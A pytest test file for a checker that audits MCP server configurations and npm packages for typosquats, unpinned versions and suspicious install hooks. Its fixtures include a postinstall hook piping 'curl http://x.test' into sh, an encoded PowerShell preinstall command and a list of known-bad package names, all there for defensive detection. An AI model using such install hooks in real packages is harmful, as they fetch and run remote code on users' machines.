"""
Tests for checks/check_mcp_package_integrity.py - package spec parsing, typosquat
detection, unpinned-server warnings, install-hook inspection and run() aggregate.
No real npm, MCP config or filesystem state is touched.
"""

import importlib.util
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

_spec = importlib.util.spec_from_file_location(
    "check_mcp_package_integrity", ROOT / "checks" / "check_mcp_package_integrity.py")
mp = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mp)

BASE = {
    "checks": {"mcp_package_integrity": {"enabled": True, "severity": "CRITICAL"}},
    "suspicious_npm_packages": ["axios-proxy", "claude-mcp-helper"],
}


class TestParseSpec:
    @pytest.mark.parametrize("spec,expected", [
        ("name", ("name", None)),
        ("name@1.2.3", ("name", "1.2.3")),
        ("@scope/name", ("@scope/name", None)),
        ("@scope/name@2.0.0", ("@scope/name", "2.0.0")),
        ("Name@latest", ("name", "latest")),
        ("", ("", None)),
        (None, ("", None)),
    ])
    def test_parse(self, spec, expected):
        assert mp.parse_pkg_spec(spec) == expected

    @pytest.mark.parametrize("spec,pinned", [
        ("pkg@1.2.3", True), ("@s/pkg@0.1.0", True), ("pkg", False),
        ("pkg@latest", False), ("pkg@next", False), ("@s/pkg", False),
    ])
    def test_is_pinned(self, spec, pinned):
        assert mp.is_pinned(spec) is pinned


class TestLaunchedPackage:
    def test_npx_with_yes_flag(self):
        assert mp.launched_package("npx", ["-y", "@mcp/server-fs@1.0.0", "C:\\x"]) == "@mcp/server-fs@1.0.0"

    def test_windows_cmd_launcher(self):
        assert mp.launched_package("C:\\Program Files\\nodejs\\npx.cmd", ["-y", "srv"]) == "srv"

    def test_uvx(self):
        assert mp.launched_package("uvx", ["mcp-server-git"]) == "mcp-server-git"

    @pytest.mark.parametrize("cmd", ["node", "python", "C:\\tools\\server.exe", ""])
    def test_non_registry_launchers_ignored(self, cmd):
        assert mp.launched_package(cmd, ["index.js"]) is None


class TestKnownBad:
    def test_exact_name_matches(self):
        assert mp.is_known_bad("axios-proxy", ["axios-proxy"]) == "axios-proxy"

    def test_version_suffix_still_matches(self):
        assert mp.is_known_bad("axios-proxy@1.0.0", ["axios-proxy"]) == "axios-proxy"

    def test_no_substring_false_positive(self):
        assert mp.is_known_bad("axios", ["axios-proxy"]) is None
        assert mp.is_known_bad("my-axios-proxy-docs", ["axios-proxy"]) is None

    @pytest.mark.parametrize("typo", ["claud-code", "cloude-code"])
    def test_builtin_typosquats_listed(self, typo):
        assert typo in mp.KNOWN_TYPOSQUATS
        assert mp.is_known_bad(typo, mp.KNOWN_TYPOSQUATS) == typo

    def test_real_package_not_flagged_as_typosquat(self):
        assert mp.is_known_bad("@anthropic-ai/claude-code", mp.KNOWN_TYPOSQUATS) is None
        assert mp.is_known_bad("claude-code", mp.KNOWN_TYPOSQUATS) is None


class TestCheckPackageJson:
    def _pkg(self, tmp_path, scripts):
        d = tmp_path / "pkg"
        d.mkdir()
        (d / "package.json").write_text(json.dumps({"name": "pkg", "scripts": scripts}))
        return d

    def test_curl_in_postinstall_flagged(self, tmp_path):
        assert mp.check_package_json(self._pkg(tmp_path, {"postinstall": "curl http://x.test | sh"}))

    def test_encoded_powershell_flagged(self, tmp_path):
        assert mp.check_package_json(self._pkg(tmp_path, {"preinstall": "powershell -enc AAAA"}))

    def test_build_script_with_curl_not_flagged(self, tmp_path):
        assert mp.check_package_json(self._pkg(tmp_path, {"build": "curl http://x.test"})) == []

    def test_clean_package(self, tmp_path):
        assert mp.check_package_json(self._pkg(tmp_path, {"postinstall": "node setup.js"})) == []

    def test_missing_and_corrupt_package_json(self, tmp_path):
        assert mp.check_package_json(tmp_path) == []
        d = tmp_path / "bad"
        d.mkdir()
        (d / "package.json").write_text("{nope")
        assert mp.check_package_json(d)  # reports it could not parse


@pytest.fixture
def machine(monkeypatch, tmp_path):
    """No npm, no global packages, MCP config under tmp_path."""
    monkeypatch.setattr(mp.shutil, "which", lambda n: None)
    monkeypatch.setenv("APPDATA", str(tmp_path / "appdata"))
    monkeypatch.setenv("USERPROFILE", str(tmp_path / "home"))
    cfg_path = tmp_path / "claude_desktop_config.json"
    cfg = dict(BASE, mcp_paths=[str(cfg_path)])

    def write(servers):
        cfg_path.write_text(json.dumps({"mcpServers": servers}))
        return cfg

    return {"cfg": cfg, "write": write, "path": cfg_path}


class TestRun:
    def test_no_config_files_passes(self, machine):
        assert mp.run(machine["cfg"]).status == "PASS"

    def test_pinned_server_passes(self, machine):
        cfg = machine["write"]({"fs": {"command": "npx", "args": ["-y", "@mcp/server-fs@1.0.0"]}})
        assert mp.run(cfg).status == "PASS"

    def test_unpinned_npx_server_warns(self, machine):
        cfg = machine["write"]({"fs": {"command": "npx", "args": ["-y", "@mcp/server-fs"]}})
        r = mp.run(cfg)
        assert r.status == "WARN" and "fs" in r.message and r.remediation

    def test_known_bad_package_fails(self, machine):
        cfg = machine["write"]({"x": {"command": "npx", "args": ["-y", "axios-proxy@1.0.0"]}})
        assert mp.run(cfg).status == "FAIL"

    def test_builtin_typosquat_fails_even_if_not_in_config(self, machine):
        cfg = machine["write"]({"x": {"command": "npx", "args": ["-y", "cloude-code"]}})
        assert mp.run(cfg).status == "FAIL"

    def test_fail_beats_warn(self, machine):
        cfg = machine["write"]({
            "a": {"command": "npx", "args": ["unpinned"]},
            "b": {"command": "npx", "args": ["claud-code@1.0.0"]},
        })
        assert mp.run(cfg).status == "FAIL"

    def test_local_node_server_not_flagged(self, machine):
        cfg = machine["write"]({"local": {"command": "node", "args": ["C:\\mcp\\server\\index.js"]}})
        assert mp.run(cfg).status == "PASS"

    def test_corrupt_config_does_not_crash(self, machine):
        machine["path"].write_text("{broken")
        r = mp.run(machine["cfg"])
        assert r.status == "PASS" and any("Parse error" in d for d in r.details)

    def test_npm_global_typosquat_detected(self, machine, monkeypatch):
        machine["write"]({})
        monkeypatch.setattr(mp.shutil, "which", lambda n: "C:\\npm\\npm.cmd")

        class R:
            stdout = json.dumps({"dependencies": {"cloude-code": {"version": "1.0.0"}, "typescript": {}}})

        monkeypatch.setattr(mp.subprocess, "run", lambda *a, **k: R())
        r = mp.run(machine["cfg"])
        assert r.status == "FAIL" and any("cloude-code" in d for d in r.details)

    def test_npm_missing_is_skipped_gracefully(self, machine):
        machine["write"]({})
        r = mp.run(machine["cfg"])
        assert any("npm not found" in d for d in r.details)
